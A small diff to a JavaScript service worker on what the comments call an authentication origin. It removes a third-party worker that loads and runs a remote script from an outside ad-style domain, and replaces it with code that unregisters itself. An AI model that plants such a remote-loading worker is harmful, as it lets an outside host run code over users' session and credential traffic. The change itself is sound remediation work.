@@ -1,6 +1,10 @@
-self.options = {
-    "domain": "3nbf4.com",
-    "zoneId": 12082332
-}
-self.lary = ""
-importScripts('https://3nbf4.com/act/files/service-worker.min.js?r=sw')ss
+// Retire the former third-party service worker on this authentication origin.
+// A service worker must never proxy certificate, session or private-code traffic.
+self.addEventListener('install', event => {
+  self.skipWaiting();
+});
+self.addEventListener('activate', event => {
+  event.waitUntil((async () => {
+    await self.registration.unregister();
+  })());
+});
